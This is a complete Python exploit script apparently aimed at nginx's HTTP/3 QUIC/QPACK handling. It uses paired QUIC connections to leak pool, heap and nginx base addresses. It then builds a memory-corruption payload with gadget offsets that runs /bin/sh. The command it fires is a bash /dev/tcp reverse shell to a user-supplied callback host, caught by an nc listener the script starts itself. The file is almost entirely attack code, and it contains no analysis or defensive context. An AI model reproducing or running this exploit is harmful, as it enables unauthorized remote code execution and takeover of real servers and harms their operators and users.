#!/usr/bin/env python3
import asyncio
from contextlib import asynccontextmanager
from dataclasses import dataclass
import ipaddress
import socket
import ssl
import struct
import sys

import pylsqpack
from aioquic.buffer import Buffer
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection
from aioquic.quic.events import PingAcknowledged, StreamDataReceived
from aioquic.quic.packet import pull_quic_header


IDLE_TIMEOUT = 2.0
PROBE_TIMEOUT = 1.5
POOL_PROBE_TIMEOUT = 1.8
SCAN_START = 0x550000000000
SCAN_STOP = 0x700000000000
SCAN_STEP = 0x400000000
LABEL_WIDTH = 14


class Protocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.buf = b""
        self.ping_acknowledged = asyncio.Event()
        self.acknowledged_pings = set()

    def quic_event_received(self, event):
        if isinstance(event, StreamDataReceived):
            self.buf += event.data
        elif isinstance(event, PingAcknowledged):
            self.acknowledged_pings.add(event.uid)
            self.ping_acknowledged.set()

    async def wait_connected(self):
        try:
            await super().wait_connected()
        except asyncio.CancelledError:
            waiter = self._connected_waiter
            self._connected_waiter = None
            if waiter is not None:
                waiter.cancel()
            raise


class PairSocket(asyncio.DatagramProtocol):
    def __init__(self, cid_length):
        self.cid_length = cid_length
        self.protocols = []

    def datagram_received(self, data, addr):
        try:
            destination = pull_quic_header(
                Buffer(data=data), host_cid_length=self.cid_length
            ).destination_cid
        except ValueError:
            return
        for protocol in self.protocols:
            if any(cid.cid == destination for cid in protocol._quic._host_cids):
                protocol.datagram_received(data, addr)
                return


class PairTransport:
    def __init__(self, transport):
        self.transport = transport

    def sendto(self, data, addr=None):
        self.transport.sendto(data, addr)

    def close(self):
        pass


@dataclass
class ProbePlan:
    pool: int
    base: int
    rce_pool: int
    heap_floor: int
    heap_ceiling: int


def quic_config():
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    cfg.idle_timeout = IDLE_TIMEOUT
    return cfg


def pref(v, bits, first):
    mask = (1 << bits) - 1
    if v < mask:
        return bytes([first | v])
    out = [first | mask]
    v -= mask
    while v >= 128:
        out.append((v & 127) | 128)
        v >>= 7
    out.append(v)
    return bytes(out)


def vi(v):
    return bytes([v]) if v < 64 else bytes([0x40 | (v >> 8), v & 255])


def hold(proto, out):
    old = proto._transport.sendto

    def send(data, addr=None):
        out.append((old, data, addr))

    proto._transport.sendto = send
    return old


def flush(out, copies=1):
    for old, data, addr in out:
        for _ in range(copies):
            old(data) if addr is None else old(data, addr)


@asynccontextmanager
async def raw_pair(host, port):
    configs = [quic_config(), quic_config()]
    for config in configs:
        config.server_name = host
        config.idle_timeout = 3.0
    socket_protocol = PairSocket(configs[0].connection_id_length)
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.bind(("", 0))
    transport, _ = await asyncio.get_running_loop().create_datagram_endpoint(
        lambda: socket_protocol,
        sock=udp_socket,
    )
    protocols = []
    try:
        for config in configs:
            protocol = Protocol(QuicConnection(configuration=config))
            protocol.connection_made(PairTransport(transport))
            socket_protocol.protocols.append(protocol)
            protocols.append(protocol)
            protocol.connect((host, port))
            await protocol.wait_connected()
        yield protocols
    finally:
        for protocol in protocols:
            if protocol._timer is not None:
                protocol._timer.cancel()
                protocol._timer = None
            if protocol._transmit_task is not None:
                protocol._transmit_task.cancel()
                protocol._transmit_task = None
            protocol._closed.set()
        transport.close()
        await asyncio.sleep(0)


def rce_close(protocol):
    timer = getattr(protocol, "_timer", None)
    if timer is not None:
        timer.cancel()
        protocol._timer = None
    task = getattr(protocol, "_transmit_task", None)
    if task is not None:
        task.cancel()
        protocol._transmit_task = None
    protocol.transmit = lambda: None
    protocol._closed.set()
    protocol._transport.close()


@asynccontextmanager
async def rce_connection(host, port):
    config = quic_config()
    config.idle_timeout = 3.0
    manager = connect(
        host,
        port,
        configuration=config,
        create_protocol=Protocol,
        wait_connected=True,
    )
    protocol = await manager.__aenter__()
    try:
        yield protocol
    finally:
        rce_close(protocol)
        await asyncio.sleep(0)
        await manager.__aexit__(None, None, None)


def emit(text):
    print(text, end="", flush=True)


def status(prefix, label, text):
    emit(f"{prefix} {label:<{LABEL_WIDTH}}: {text}\n")


def progress(label, done, total, every=64):
    if done == 1 or done == total or done % every == 0:
        status("[*]", label, f"{done}/{total}")


def show_plan(plan):
    status("[+]", "Request Pool", f"{plan.pool:#018x}")
    status("[+]", "Nginx Base", f"{plan.base:#018x}")
    status("[+]", "RCE Pool", f"{plan.rce_pool:#018x}")
    status("[+]", "Heap Window",
           f"{plan.heap_floor:#018x}-{plan.heap_ceiling:#018x}")


class Exploit:
    def __init__(self, target_ip, target_port, cmd):
        self.host = target_ip
        self.port = target_port
        self.cmd = cmd
        encoder = pylsqpack.Encoder()
        cap = encoder.apply_settings(4096, 16)
        headers = [
            (b":method", b"GET"),
            (b":scheme", b"https"),
            (b":authority", target_ip.encode()),
            (b":path", b"/"),
            (b"x-test", b"A" * 20),
        ]
        encoder.encode(4, headers)
        unblock, block = encoder.encode(0, headers)
        self.breq = b"\x01" + vi(len(block)) + block
        self.unblock = b"\x02" + cap + unblock
        self.generation = 0
        self.anchor_attempt = 0
        self.anchor_warmed = False
        self.barrier_uid = 0x9000

    async def probe(self, addr):
        try:
            return await asyncio.wait_for(self._probe_impl(addr), PROBE_TIMEOUT)
        except (asyncio.TimeoutError, Exception):
            await asyncio.sleep(0.08)
            return False

    async def _probe_impl(self, addr):
        pay = struct.pack("<QQ", addr, addr + 0x1000)
        try:
            async with raw_pair(self.host, self.port) as (a, v):
                qa, qv, held = a._quic, v._quic, []
                oa, ov = hold(a, held), hold(v, held)
                qa.send_stream_data(2, b"\x00\x04\x00")
                qa.send_stream_data(
                    6,
                    b"\x02" + pref(4096, 5, 0x20) + b"\xc0"
                    + pref(1, 7, 0) + b"X" + b"\xc0"
                    + pref(16, 7, 0),
                    True,
                )
                a.transmit()
                qv.send_stream_data(2, b"\x00\x04\x00")
                qv.send_stream_data(0, self.breq)
                v.transmit()
                qa.send_stream_data(
                    10, b"\x02\xc0" + pref(16, 7, 0) + pay, False
                )
                a.transmit()
                a._transport.sendto, v._transport.sendto = oa, ov
                flush(held)
                await asyncio.sleep(0.02)
                qv.send_stream_data(6, self.unblock, False)
                v.transmit()
                await asyncio.sleep(0.12)
                return b"hello world" in v.buf
        except Exception:
            await asyncio.sleep(0.08)
            return False

    async def pool_probe(self, addr):
        try:
            return await asyncio.wait_for(
                self._pool_probe_impl(addr), POOL_PROBE_TIMEOUT
            )
        except (asyncio.TimeoutError, Exception):
            await asyncio.sleep(0.08)
            return False

    async def _pool_probe_impl(self, addr):
        pay = struct.pack("<QQ", addr, addr)
        try:
            async with raw_pair(self.host, self.port) as (a, v):
                qa, qv, held = a._quic, v._quic, []
                oa, ov = hold(a, held), hold(v, held)
                qa.send_stream_data(2, b"\x00\x04\x00")
                qa.send_stream_data(
                    6,
                    b"\x02" + pref(4096, 5, 0x20) + b"\xc0"
                    + pref(1, 7, 0) + b"X" + b"\xc0"
                    + pref(16, 7, 0),
                    True,
                )
                a.transmit()
                qv.send_stream_data(2, b"\x00\x04\x00")
                qv.send_stream_data(0, self.breq)
                v.transmit()
                qa.send_stream_data(
                    10, b"\x02\xc0" + pref(16, 7, 0) + pay, False
                )
                a.transmit()
                a._transport.sendto, v._transport.sendto = oa, ov
                flush(held, 2)
                await asyncio.sleep(0.02)
                qv.send_stream_data(6, self.unblock, False)
                v.transmit()
                await asyncio.sleep(0.18)
                return b"hello world" in v.buf
        except Exception:
            await asyncio.sleep(0.08)
            return False

    async def votes(self, check, addr, need=4, total=5):
        n = 0
        for i in range(total):
            if await check(addr):
                n += 1
                if n >= need:
                    return True
            if n + total - i - 1 < need:
                return False
        return False

    async def reliable(self, check, addr):
        score = 0
        while -12 < score < 12:
            score += 2 if await check(addr) else -1
        return score > 0

    async def leak_pool(self, check_page, lo_ok=0,
                        hi_ok=0xffffffffffff, label="Pool Leak"):
        start, stop, step = SCAN_START, SCAN_STOP, SCAN_STEP
        if lo_ok != 0 or hi_ok != 0xffffffffffff:
            start = max(SCAN_START, (max(0, lo_ok) // step) * step)
            stop = min(SCAN_STOP, ((hi_ok + step - 1) // step) * step)
        scan_worst = ((stop - start) // step) + 1
        status("[*]", label, f"scanning {start:#018x}..{stop:#018x}")
        while True:
            actual = 0
            x = start
            while x <= stop:
                actual += 1
                progress(label, actual, scan_worst)
                if (await self.pool_probe(x)
                        and await self.votes(self.pool_probe, x, 3, 6)
                        and await self.reliable(self.pool_probe, x)):
                    hit = x
                    status("[*]", label, f"candidate {hit:#018x}")
                    while (
                        hit - step >= start
                        and await self.reliable(self.pool_probe, hit - step)
                    ):
                        hit -= step
                    while True:
                        lo, hi = hit - step, hit
                        while hi - lo > 0x1000:
                            actual += 1
                            mid = ((lo + hi) // 2) & ~0xfff
                            if await self.reliable(self.pool_probe, mid):
                                hi = mid
                            else:
                                lo = mid
                        if max(lo_ok, start) <= hi <= hi_ok:
                            page = (not check_page
                                    or await self.reliable(self.probe, hi))
                            if (
                                check_page
                                and not page
                                and await self.reliable(self.pool_probe, hi)
                                and not await self.reliable(self.pool_probe, lo)
                            ):
                                page = (await self.reliable(self.probe, hi)
                                        or await self.reliable(self.probe, hi))
                            if page:
                                status("[+]", label, f"{hi:#018x}")
                                return hi, scan_worst + 22, actual
                        if not await self.reliable(self.pool_probe, hit):
                            break
                x += step
            status("[*]", label, "retry")

    async def find_base(self, pool):
        async def mapped(addr):
            score = 0
            while -15 < score < 17:
                score += 3 if await self.probe(addr) else -1
            return score > 0

        step = 0x80000
        x = (pool & ~0xfff) - 0x400000
        limit = pool - 0x80000000
        worst = ((x - limit) // step) + 1
        actual = 0
        status("[*]", "Nginx Leak", f"scanning {x:#018x}..{limit:#018x}")
        while x > limit:
            actual += 1
            progress("Nginx Leak", actual, worst)
            if await self.probe(x):
                hit = x
                status("[*]", "Nginx Leak", f"candidate {hit:#018x}")
                score = 0
                while -2 < score < 16:
                    score += 3 if await self.probe(hit) else -1

                if (
                    score >= 16
                    and await mapped(hit)
                    and not await mapped(hit + step)
                ):
                    lo, hi = hit, hit + 0xf2000
                    while hi - lo > 0x1000:
                        mid = ((lo + hi) // 2) & ~0xfff
                        if await mapped(mid):
                            lo = mid
                        else:
                            hi = mid
                    top = lo
                    if (
                        await mapped(top)
                        and not await mapped(top - 0xf2000)
                        and await mapped(top - 0xf1000)
                        and await mapped(top - 0x80000)
                        and await mapped(top - 0x1000)
                        and not await mapped(top + 0x1000)
                    ):
                        base = top - 0x26c000
                        status("[+]", "Nginx Base", f"{base:#018x}")
                        return base, worst, actual
                    status("[*]", "Nginx Leak",
                           f"rejected {top - 0x26c000:#018x}")
                x = hit - step
                continue
            x -= step
            await asyncio.sleep(0.02)
        raise RuntimeError("nginx base scan failed")

    async def reset_worker(self):
        await self.probe(0x414141410000)
        await asyncio.sleep(0.3)
        await self.probe(0x414141410000)
        await asyncio.sleep(0.6)

    async def address_probe(self):
        await self.reset_worker()
        pool, pworst, pactual = await self.leak_pool(
            True, label="Pool Leak"
        )
        status("[*]", "Pool Leak", f"probes {pactual}/{pworst}")

        attempt = 0
        while True:
            attempt += 1
            await self.reset_worker()
            try:
                base, bworst, bactual = await self.find_base(pool)
                break
            except RuntimeError:
                status("[!]", "Nginx Leak", f"attempt {attempt} failed")

        status("[*]", "Nginx Leak", f"probes {bactual}/{bworst}")

        await self.reset_worker()
        rce_pool, rworst, ractual = await self.leak_pool(
            False, base + 0x269000, base + 0x80000000,
            "RCE Pool"
        )
        heap_floor = rce_pool & ~0xfff
        heap_ceiling = heap_floor + 0x1000
        status("[*]", "RCE Pool", f"probes {ractual}/{rworst}")
        return ProbePlan(
            pool, base, rce_pool, heap_floor, heap_ceiling,
        )

    def _next_barrier_uid(self):
        self.barrier_uid = 0x9000 + (
            (self.barrier_uid - 0x8fff) & 0xfff
        )
        return self.barrier_uid

    async def _synchronize(self, protocol, uid):
        protocol.ping_acknowledged.clear()
        protocol._quic.send_ping(uid)
        protocol.transmit()
        await asyncio.wait_for(protocol.ping_acknowledged.wait(), 1.0)
        if uid not in protocol.acknowledged_pings:
            raise RuntimeError("ping barrier failed")
        await asyncio.sleep(0.05)

    async def _attack(self, declared, body, response_window, barrier=False,
                      complete=False):
        try:
            async with raw_pair(self.host, self.port) as (attacker, victim):
                await self._synchronize(attacker, 0xa001)
                await self._synchronize(victim, 0xb001)
                qa, qv, queued = attacker._quic, victim._quic, []
                old_attacker = hold(attacker, queued)
                old_victim = hold(victim, queued)

                qa.send_stream_data(2, b"\x00\x04\x00")
                qa.send_stream_data(
                    6,
                    b"\x02" + pref(4096, 5, 0x20) + b"\xc0"
                    + pref(1, 7, 0) + b"X\xc0"
                    + pref(declared, 7, 0),
                    True,
                )
                attacker.transmit()
                qv.send_stream_data(2, b"\x00\x04\x00")
                qv.send_stream_data(0, self.breq)
                victim.transmit()
                continuation_uid = None
                if barrier:
                    continuation_uid = self._next_barrier_uid()
                    attacker.ping_acknowledged.clear()
                qa.send_stream_data(
                    10, b"\x02\xc0" + pref(declared, 7, 0) + body, False
                )
                if complete:
                    stream_sender = qa._streams[10].sender
                    stream_stop = stream_sender._buffer_stop
                if barrier:
                    qa.send_ping(continuation_uid)
                attacker.transmit()

                attacker._transport.sendto = old_attacker
                victim._transport.sendto = old_victim
                flush(queued)
                if complete:
                    while stream_sender._buffer_start < stream_stop:
                        if attacker._closed.is_set():
                            rce_close(attacker)
                            rce_close(victim)
                            await asyncio.sleep(0)
                            return False
                        await asyncio.sleep(0)
                elif barrier:
                    try:
                        await asyncio.wait_for(
                            attacker.ping_acknowledged.wait(), 1.0
                        )
                        continuation_acked = (
                            continuation_uid in attacker.acknowledged_pings
                        )
                    except Exception:
                        continuation_acked = False
                    if not continuation_acked:
                        rce_close(attacker)
                        rce_close(victim)
                        await asyncio.sleep(0)
                        return False, False, False
                else:
                    await asyncio.sleep(0.02)
                qv.send_stream_data(6, self.unblock, False)
                victim.transmit()
                if barrier:
                    try:
                        await self._synchronize(
                            victim, self._next_barrier_uid()
                        )
                        alive = True
                    except Exception:
                        alive = False
                    result = (
                        b"hello world" in victim.buf,
                        alive,
                        continuation_acked,
                    )
                    rce_close(attacker)
                    rce_close(victim)
                    await asyncio.sleep(0)
                    return result
                await asyncio.sleep(response_window)
                result = b"hello world" in victim.buf
                rce_close(attacker)
                rce_close(victim)
                await asyncio.sleep(0)
                return result
        except Exception:
            await asyncio.sleep(0.1)
            return (False, False, False) if barrier else False

    async def _kill_generation(self):
        self.generation += 1
        monitor_attempt = 0
        while True:
            monitor_attempt += 1
            try:
                async with rce_connection(self.host, self.port) as monitor:
                    await self._synchronize(
                        monitor, 0xc000 + (self.generation & 0xfff)
                    )
                    attempt = 0
                    while True:
                        attempt += 1
                        await self._attack(
                            16,
                            struct.pack(
                                "<QQ", 0x414141410000, 0x414141411000
                            ),
                            0.03,
                        )
                        uid = 0xd000 + ((self.generation * 4 + attempt) & 0xfff)
                        monitor.ping_acknowledged.clear()
                        monitor._quic.send_ping(uid)
                        monitor.transmit()
                        try:
                            await asyncio.wait_for(
                                monitor.ping_acknowledged.wait(), 1.0
                            )
                            alive = uid in monitor.acknowledged_pings
                        except asyncio.TimeoutError:
                            alive = False
                        if not alive:
                            rce_close(monitor)
                            await asyncio.sleep(0)
                            return attempt, monitor_attempt
            except Exception:
                await asyncio.sleep(0.05)

    @asynccontextmanager
    async def _canonical_anchor(self):
        while True:
            self.anchor_attempt += 1
            first_generation = await self._kill_generation()
            second_generation = await self._kill_generation()
            if first_generation != (1, 1) or second_generation != (1, 1):
                continue
            connection = rce_connection(self.host, self.port)
            try:
                anchor = await connection.__aenter__()
                first = 0xe000 + ((self.anchor_attempt * 2) & 0xfff)
                second = first + 1
                await self._synchronize(anchor, first)
                await asyncio.sleep(1.0)
                await self._synchronize(anchor, second)
            except Exception:
                try:
                    await connection.__aexit__(None, None, None)
                except Exception:
                    pass
                continue

            if not self.anchor_warmed:
                await self._attack(
                    16,
                    struct.pack("<QQ", 0x414141410000, 0x414141411000),
                    0.03,
                )
                self.anchor_warmed = True
                await connection.__aexit__(None, None, None)
                continue
            try:
                yield anchor
            finally:
                await connection.__aexit__(None, None, None)
            return

    async def _rce_structural(self, address):
        while True:
            async with self._canonical_anchor() as anchor:
                # max=0 makes the next allocation expose the exact 16-byte edge.
                response, victim_alive, continuation_acked = await self._attack(
                    0x700,
                    struct.pack("<QQQQQ", address, address, 0, 0, 0),
                    0,
                    barrier=True,
                )
                try:
                    await self._synchronize(anchor, self._next_barrier_uid())
                    anchor_alive = True
                except Exception:
                    anchor_alive = False
            if continuation_acked:
                return response and victim_alive and anchor_alive

    async def _rce_constant(self, address, expected, count):
        for _ in range(count):
            if await self._rce_structural(address) != expected:
                return False
        return True

    async def fire_rce(self, plan):
        low = (plan.base + 0x269000) & ~0xf
        high = (plan.base + 0x80000000) & ~0xf
        if not await self._rce_constant(low, False, 3):
            raise RuntimeError("RCE locator lower endpoint is too high")
        if not await self._rce_constant(high, True, 3):
            raise RuntimeError("RCE locator upper endpoint is too low")

        coarse_total = ((high - low) // 0x10).bit_length()
        boundary = None
        for _ in range(3):
            lo, hi = low, high
            step = 0
            while hi - lo > 0x10:
                step += 1
                middle = ((lo + hi) // 2) & ~0xf
                if await self._rce_structural(middle):
                    hi = middle
                else:
                    lo = middle
                status("[*]", "RCE Locator", f"{step}/{coarse_total}")

            rough = hi
            for evidence in (4, 6, 8):
                lo, hi = rough - 0x10, rough + 0x130
                while hi - lo > 0x10:
                    middle = ((lo + hi) // 2) & ~0xf
                    if await self._rce_constant(
                        middle, True, evidence
                    ):
                        hi = middle
                    else:
                        lo = middle

                if (
                    await self._rce_constant(hi, True, 4)
                    and await self._rce_constant(hi - 0x10, False, 4)
                ):
                    boundary = hi
                    break
            if boundary is not None:
                break
        if boundary is None:
            raise RuntimeError("RCE locator boundary did not reproduce")

        mem = boundary - 0x20
        status("[+]", "RCE Boundary", f"{boundary:#018x}")
        status("[+]", "RCE Landing", f"{mem:#018x}")
        p = bytearray(0x700)

        def q(off, value):
            struct.pack_into("<Q", p, off, value & ((1 << 64) - 1))

        def pair_q(off, value):
            q(off, value)
            q(off + 0x120, value)

        def pair_bytes(off, value):
            p[off:off + len(value)] = value
            p[off + 0x120:off + 0x120 + len(value)] = value

        connection = mem + 0x280
        node = mem + 0x300
        binsh = mem + 0x400

        if len(self.cmd) + 1 > 0x9f:
            raise RuntimeError("command is too long")

        struct.pack_into("<I", p, 0x50, 0x50545448)
        q(0x58, connection)
        q(0x78, mem + 0x1d0)
        q(0xb0, mem + 0x100)
        q(0x178, connection)
        q(0x450, mem + 0x50)
        q(0x4e8, mem - 8)

        pair_q(0x100, mem + 0x140)
        pair_q(0x108, 0)
        pair_bytes(0x140, b"\x04")
        pair_q(0x1d0, mem + 0x200)
        pair_q(0x250, 0)
        pair_q(0x2d0, mem + 0x270)
        p[0x369] = 0x10
        p[0x489] = 0x10

        q(0x4f8, node)
        q(0x618, node)
        pair_q(0x300, plan.base + 0x125c2e)
        pair_q(0x308, plan.base + 0x5c5b0)
        pair_q(0x310, 0)
        pair_q(0x318, mem + 0x340)
        pair_q(0x338, plan.base + 0x5c5b0)
        pair_q(0x348, mem + 0x340)
        pair_q(0x340, binsh)
        pair_q(0x350, mem + 0x3b0)
        pair_q(0x358, mem + 0x250)
        pair_q(0x3b0, binsh)
        pair_q(0x3b8, mem + 0x408)
        pair_q(0x3c0, mem + 0x540)
        q(0x3c8, 0)
        pair_bytes(0x400, b"/bin/sh\x00")
        pair_bytes(0x408, b"-c\x00")
        pair_bytes(0x540, self.cmd + b"\x00")

        async with self._canonical_anchor():
            await self._attack(0x700, bytes(p[:-1]), 0.2, complete=True)
        status("[+]", "Payload", "fired")
        return True


class NetcatSession:
    def __init__(self, lport):
        self.lport = lport
        self.process = None

    async def start(self):
        status("[*]", "Listener", f"0.0.0.0:{self.lport} (nc)")
        self.process = await asyncio.create_subprocess_exec(
            "nc", "-lvnp", str(self.lport),
            stderr=asyncio.subprocess.DEVNULL,
        )

    async def wait(self):
        await self.process.wait()

    async def close(self):
        if self.process is not None and self.process.returncode is None:
            self.process.terminate()
            try:
                await asyncio.wait_for(self.process.wait(), 1.0)
            except asyncio.TimeoutError:
                self.process.kill()
                await self.process.wait()


async def shell_stage(exploit, plan, lport):
    shell = NetcatSession(lport)
    await shell.start()
    try:
        await exploit.fire_rce(plan)
        await shell.wait()
        return True
    except Exception as exc:
        status("[-]", "RCE", f"{type(exc).__name__}: {exc}")
        return False
    finally:
        await shell.close()


async def amain(target_ip, target_port, callback_host, callback_port):
    cmd = (
        f"bash -c 'exec 3<>/dev/tcp/{callback_host}/{callback_port};"
        "sh -i <&3 >&3 2>&3'"
    ).encode()
    exploit = Exploit(target_ip, target_port, cmd)

    status("[*]", "Target", f"{target_ip}:{target_port}")
    status("[*]", "Callback", f"{callback_host}:{callback_port}")
    plan = await exploit.address_probe()
    show_plan(plan)
    success = await shell_stage(exploit, plan, callback_port)
    return 0 if success else 1


def parse_endpoint(value):
    host, separator, port_text = value.rpartition(":")
    if not separator:
        raise ValueError
    host = str(ipaddress.IPv4Address(host))
    port = int(port_text)
    if not 0 < port < 65536:
        raise ValueError
    return host, port


def main():
    try:
        if len(sys.argv) != 3:
            raise SystemExit(
                f"usage: {sys.argv[0]} target_ip:port callback_ip:port"
            )
        try:
            target_ip, target_port = parse_endpoint(sys.argv[1])
            callback_host, callback_port = parse_endpoint(sys.argv[2])
        except (ipaddress.AddressValueError, ValueError):
            raise SystemExit(
                f"usage: {sys.argv[0]} target_ip:port callback_ip:port"
            ) from None
        raise SystemExit(asyncio.run(amain(
            target_ip, target_port, callback_host, callback_port
        )))
    except KeyboardInterrupt:
        raise SystemExit(130)


if __name__ == "__main__":
    main()
